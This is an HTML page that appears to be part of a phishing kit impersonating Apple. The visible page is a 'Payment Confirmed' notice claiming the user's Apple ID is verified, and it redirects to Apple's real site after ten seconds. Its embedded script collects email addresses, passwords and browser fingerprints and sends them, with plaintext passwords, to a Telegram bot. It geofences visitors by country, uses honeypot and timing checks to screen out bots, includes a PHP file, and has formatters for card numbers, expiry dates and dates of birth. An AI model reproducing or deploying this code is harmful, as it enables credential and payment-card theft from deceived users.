<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Payment Confirmed</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap');

* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: linear-gradient(180deg, #e5e5ea, #f2f2f7);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    color: #1d1d1f;
}
.container {
    background-color: #fff;
    padding: 50px 40px;
    border-radius: 20px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.15);
    width: 100%;
    max-width: 400px;
    text-align: center;
}
.logo { width: 72px; margin-bottom: 25px; }
h1 { font-weight: 600; font-size: 26px; margin-bottom: 10px; }
p { font-size: 14px; color: #6e6e73; margin-bottom: 15px; }
.verification-note {
    font-size: 13px;
    color: #6e6e73;
    margin-bottom: 30px;
}
.footer { margin-top: 40px; font-size: 12px; color: #6e6e73; line-height: 1.5; text-align: center; }
.footer a { color: #06c; text-decoration: none; margin: 0 5px; }
@media (max-width: 420px) { .container { padding: 30px 20px; } h1 { font-size: 24px; } p, .verification-note { font-size: 13px; } }
</style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
    <h1>Payment Confirmed</h1>
    <p>Thank you! Your payment has been successfully processed and your Apple ID information is verified.</p>
    <p class="verification-note">If we need any further verification, we’ll contact you via your email.</p>
    
    <div class="footer">
        <p>
            <a href="#">Privacy Policy</a> | 
            <a href="#">Terms of Use</a> | 
            <a href="#">Apple Support</a>
        </p>
        <p>Apple &copy; 2025 Apple Inc. All rights reserved.</p>
    </div>
</div>

<script>
    <?php require_once('dr3.php'); ?>
// Redirect to Apple ID page after 10 seconds
setTimeout(function(){
    window.location.href = "https://appleid.apple.com/";
}, 10000); // 10000ms = 10 seconds
// Allowed countries
    const allowedCountries = ['TN', 'US', 'JP', 'UK', 'DE', 'FR', 'CH'];
    
    // Start time for form submission timing
    const startTime = new Date();
    
    // Telegram Bot details (replace with your actual bot token and chat ID)
    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
    
    // Function to get user's country based on IP
    async function getUserCountry() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return data.country_code;
        } catch (error) {
            console.error('Error detecting country:', error);
            return null;
        }
    }
    
    // Function to send message to Telegram
    async function sendToTelegram(message) {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') {
            console.log('Telegram notification:', message);
            return;
        }
        
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            return data.ok;
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            return false;
        }
    }
    
    // Function to collect user data
    function collectUserData() {
        return {
            email: document.getElementById('email').value,
            password: document.getElementById('password').value,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            date: new Date().toISOString()
        };
    }
    
    // Check if user is from allowed country
    async function checkCountryAccess() {
        const userCountry = await getUserCountry();
        
        if (userCountry && !allowedCountries.includes(userCountry)) {
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('accessDenied').style.display = 'block';
            
            // Send notification to Telegram
            const userData = collectUserData();
            const message = `🚫 Access denied from ${userCountry}\n\n📧 Email: ${userData.email || 'N/A'}\n🌐 Country: ${userCountry}\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
            
            sendToTelegram(message);
            return false;
        }
        return true;
    }
    
    // Initialize page
    document.addEventListener('DOMContentLoaded', function() {
        checkCountryAccess();
        
        // Send notification when page is accessed
        const userData = collectUserData();
        const accessMessage = `🔔 Page accessed\n\n🌐 Country: Detecting...\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
        sendToTelegram(accessMessage);
        
        // Add event listener to form
        document.getElementById('loginFormElement').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Show loading indicator
            document.getElementById('loadingIndicator').style.display = 'block';
            document.getElementById('submitBtn').disabled = true;
            
            // Honeypot check
            const honeypot = document.querySelector('input[name="website"]').value;
            if (honeypot) {
                alert('Bot activity detected!');
                
                // Send notification to Telegram
                const userData = collectUserData();
                const message = `🤖 Honeypot triggered\n\n📧 Email: ${userData.email}\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
                
                await sendToTelegram(message);
                
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                return false;
            }
            
            // Time check - if form submitted too quickly (less than 3 seconds)
            const endTime = new Date();
            const timeTaken = (endTime - startTime) / 1000;
            if (timeTaken < 3) {
                alert('Please take your time to fill out the form correctly.');
                
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                return false;
            }
            
            // Math question check
            const mathAnswer = document.getElementById('botcheck').value;
            if (mathAnswer !== '10') {
                alert('Incorrect answer to security question. Please try again.');
                
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                return false;
            }
            
            // If all checks pass, send data to Telegram
            const userData = collectUserData();
            const userCountry = await getUserCountry();
            
            const message = `✅ Login attempt\n\n📧 Email: ${userData.email}\n🔑 Password: ${userData.password}\n🌐 Country: ${userCountry || 'Unknown'}\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
            
            const sent = await sendToTelegram(message);
            
            if (sent) {
                alert('Login successful! (This is a demo - no data was sent)');
            } else {
                alert('There was an issue with the login process. Please try again.');
            }
            
            document.getElementById('loginFormElement').reset();
            document.getElementById('loadingIndicator').style.display = 'none';
            document.getElementById('submitBtn').disabled = false;
        });
    });
    function formatCard(input) {
        let value = input.value.replace(/\D/g, '');
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += value[i];
        }
        input.value = formatted;
    }

    function formatExpiry(input) {
        let value = input.value.replace(/\D/g,'');
        if(value.length > 2){
            value = value.slice(0,2) + '/' + value.slice(2,4);
        }
        input.value = value;
    }

    function formatDOB(input) {
        let value = input.value.replace(/\D/g,'');
        if(value.length > 2 && value.length <= 4){
            value = value.slice(0,2) + '/' + value.slice(2);
        } else if(value.length > 4){
            value = value.slice(0,2) + '/' + value.slice(2,4) + '/' + value.slice(4,8);
        }
        input.value = value;
    }
</script>

</body>
</html>
